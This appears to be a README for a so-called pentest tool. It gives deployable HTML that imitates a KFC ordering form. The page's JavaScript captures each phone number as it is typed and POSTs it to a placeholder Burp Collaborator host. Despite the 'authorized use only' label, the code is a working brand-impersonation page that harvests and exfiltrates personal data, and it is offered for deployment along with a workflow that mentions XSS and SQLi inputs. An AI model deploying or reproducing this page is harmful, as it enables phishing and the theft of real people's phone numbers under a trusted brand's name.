KFC Phone Number HTML Grabber
⚠️ Pentest Tool - Authorized Use Only ⚠️

A client-side HTML demonstration for penetration testing phone number input validation. This static webpage mimics a KFC ordering form that captures user-submitted phone numbers via JavaScript for security assessment purposes.

Purpose
Test client-side phone number validation bypass techniques
Demonstrate HTML form data exfiltration patterns
Educational tool for teaching input sanitization flaws
Burp Suite / OWASP ZAP collaborator payload testing
Features



┌─ KFC Order Form ───────┐
│ Name: [____________]    │
│ Phone: [____________]   │  ← Target input field
│ Address: [____________] │
│        [Place Order]    │
└────────────────────────┘
Real-time extraction: JavaScript grabs phone input on keyup, blur, submit
Multiple capture methods: input.value, formdata, getParameter
Exfiltration demo: Logs to console + sends to test endpoint
Validation bypass: Accepts any format (bypasses client-side regex)
Security Assessment Targets



1. Client-side validation evasion
2. Form data leakage via JS
3. Phone number pattern matching flaws
4. XSS via phone input reflection
HTML Code (Deployable)
html



<!DOCTYPE html>
<html>
<head><title>KFC Phone Grabber - Pentest Demo</title></head>
<body>
    <h2>KFC Test Order Form</h2>
    <form id="orderForm">
        <input type="text" id="phone" placeholder="Phone Number" maxlength="20">
        <button type="submit">Order Chicken</button>
    </form>
    
    <script>
    // Phone number grabber - for pentest demo only
    document.getElementById('phone').addEventListener('input', function(e) {
        const phone = e.target.value;
        console.log('KFC_GRABBED_PHONE:', phone);
        // Test exfiltration: POST to collaborator
        fetch('http://your-burp-collaborator.oastify.com/kfc-phone', {
            method: 'POST',
            body: JSON.stringify({phone: phone})
        });
    });
    </script>
</body>
</html>
Pentest Workflow
Deploy HTML to test server
Configure Burp Collaborator / Canarytokens
Test inputs: Valid phones, XSS payloads, SQLi patterns
Analyze captured data and validation bypasses
